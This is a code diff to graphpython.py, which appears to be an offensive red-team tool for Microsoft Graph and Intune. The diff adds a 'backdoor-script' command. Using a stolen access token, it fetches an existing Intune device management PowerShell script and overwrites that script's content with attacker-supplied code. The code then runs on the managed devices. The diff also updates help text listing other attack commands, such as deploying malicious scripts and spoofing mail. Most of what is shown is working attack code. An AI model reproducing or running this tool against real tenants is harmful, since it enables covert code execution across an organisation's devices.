@@ -156,6 +156,7 @@ def list_commands():
     intune_exploit = [
         ["Dump-DeviceManagementScripts", "Dump device management PowerShell scripts"],
         ["Get-ScriptContent", "Get device management script content"],
+        ["Backdoor-Script", "Add malicious code to existing device management script"],
         ["Deploy-MaliciousScript", "Deploy new malicious device management PowerShell script (all devices)"],
         # Deploy-MaliciousWin32App - Deploy malicious exe/msi to managed devices
         ["Display-AVPolicyRules", "Display antivirus policy rules"],
@@ -595,6 +596,7 @@ def main():
           graphpython.py --command spoof-owaemailmessage [--id <userid to spoof>] --token token --email email-body.txt
           graphpython.py --command get-manageddevices --token intune-token
           graphpython.py --command deploy-maliciousscript --script malicious.ps1 --token token
+          graphpython.py --command backdoor-script --id <scriptid> --script backdoored-script.ps1 --token token
           graphpython.py --command add-exclusiongrouptopolicy --id <policyid> --token token
           graphpython.py --command reboot-device --id <deviceid> --token eyj0...
     ''')
@@ -619,7 +621,7 @@ def main():
     parser.add_argument("--only-return-cookies", action="store_true", help="Only return cookies from the request (open-owamailboxinbrowser)")
     parser.add_argument("--mail-folder", choices=['allitems', 'inbox', 'archive', 'drafts', 'sentitems', 'deleteditems', 'recoverableitemsdeletions'], help="Mail folder to dump (dump-owamailbox)")
     parser.add_argument("--top", type=int, help="Number (int) of messages to retrieve (dump-owamailbox)")
-    parser.add_argument("--script", help="File containing the script content (deploy-maliciousscript)")
+    parser.add_argument("--script", help="File containing the script content (deploy-maliciousscript and backdoor-script)")
     parser.add_argument("--email", help="File containing OWA email message body content (spoof-owaemailmessage)")
     args = parser.parse_args()
 
@@ -651,7 +653,7 @@ def main():
     "get-devicegrouppolicydefinition", "dump-devicemanagementscripts", "get-scriptcontent", 
     "get-roledefinitions", "get-roleassignments", "display-avpolicyrules", "display-asrpolicyrules", "display-diskencryptionpolicyrules", 
     "display-firewallrulepolicyrules", "display-lapsaccountprotectionpolicyrules", "display-usergroupaccountprotectionpolicyrules", 
-    "display-edrpolicyrules","add-exclusiongrouptopolicy", "deploy-maliciousscript", "reboot-device", "shutdown-device", "lock-device", 
+    "display-edrpolicyrules","add-exclusiongrouptopolicy", "deploy-maliciousscript", "reboot-device", "shutdown-device", "lock-device", "backdoor-script",
     "add-applicationpermission", "new-signedjwt", "add-applicationcertificate", "get-application", "locate-permissionid", "get-serviceprincipal"
 ]
 
@@ -734,7 +736,7 @@ def main():
             "get-deviceenrollmentconfigurations", "get-devicegrouppolicyconfigurations", 
             "get-devicegrouppolicydefinition", "dump-devicemanagementscripts", "update-userproperties",
             "get-scriptcontent", "get-roledefinitions", "get-roleassignments", "display-avpolicyrules",
-            "display-asrpolicyrules", "display-diskencryptionpolicyrules", "display-firewallrulepolicyrules",
+            "display-asrpolicyrules", "display-diskencryptionpolicyrules", "display-firewallrulepolicyrules", "backdoor-script",
             "display-edrpolicyrules", "display-lapsaccountprotectionpolicyrules", "display-usergroupaccountprotectionpolicyrules", 
             "add-exclusiongrouptopolicy","deploy-maliciousscript", "reboot-device", "add-applicationpermission", "new-signedjwt",
             "add-applicationcertificate", "get-application", "get-serviceprincipal", "get-serviceprincipalapproleassignments"]:
@@ -4544,10 +4546,6 @@ openssl pkcs12 -export -out certificate.pfx -inkey private.key -in certificate.c
             print(f"[!] HTTP Error: {ex}")
         print("=" * 80)
 
-    # backdoor-script
-    # - alter a script in place already
-    # - add file option for code to add 
-
     # display-avpolicyrules
     elif args.command and args.command.lower() == "display-avpolicyrules":
         if not args.id:
@@ -5520,6 +5518,67 @@ openssl pkcs12 -export -out certificate.pfx -inkey private.key -in certificate.c
         else:
             print_red(f"[-] Failed to create script: {response.status_code}")
             print(response.text)
+        print("=" * 80)
+
+    # backdoor-script
+    elif args.command and args.command.lower() == "backdoor-script":
+        if not args.id or not args.script:
+            print_red("[-] Error: --id and --script required for Backdoor-Script command")
+            return
+        print_yellow("\n[*] Backdoor-Script")
+        print("=" * 80)
+        api_url = f"https://graph.microsoft.com/beta/deviceManagement/deviceManagementScripts/{args.id}"
+        user_agent = get_user_agent(args)
+        headers = {
+            'Authorization': f'Bearer {access_token}',
+            'Content-Type': 'application/json',
+            'User-Agent': user_agent
+        }
+        
+        # 1. get current target script settings and encode new script content so we don't override anything
+        # ~> could add option to alter pre-existing settings...
+        try:
+            script_content = read_file_content(args.script)
+            encoded_script_content = base64.b64encode(script_content.encode('utf-8')).decode('utf-8')
+        except Exception as e:
+            print_red(f"[-] Error reading or encoding script file: {e}")
+            return
+
+        response = requests.get(api_url, headers=headers)
+        if response.ok:
+            json_data = response.json()
+            json_data.pop('@odata.context', None) # remove or 400 err
+            json_data.pop('id', None) # remove or 400 err
+            json_data.pop('createdDateTime', None) # remove or 400 err
+            json_data.pop('lastModifiedDateTime', None) # remove or 400 err
+            json_data['scriptContent'] = encoded_script_content # replace with our new script content
+        else:
+            print_red(f"[-] HTTP Error: {response.status_code}")
+            print_red(response.text)
+            return
+
+        # 2. patch script with updated script content
+        patch = requests.patch(api_url, headers=headers, json=json_data)
+        if patch.ok:
+            print_green("\n[+] Patched device management script successfully\n")
+            json_data = patch.json()
+
+            script_content = json_data.get('scriptContent')
+            if script_content:
+                decoded_script_content = base64.b64decode(script_content).decode('utf-8')
+                json_data['scriptContent'] = decoded_script_content
+
+            json_data.pop('@odata.context', None)
+            json_data.pop('scriptContent', None)
+            for key, value in json_data.items():
+                print(f"{key} : {value}")
+
+            if script_content:
+                print_green("scriptContent :\n")
+                print(decoded_script_content)
+        else:
+            print_red(f"[-] Error patching device management script: {patch.status_code}")
+            print_red(patch.text)
         print("=" * 80)
 
     # deploy-maliciouswin32app
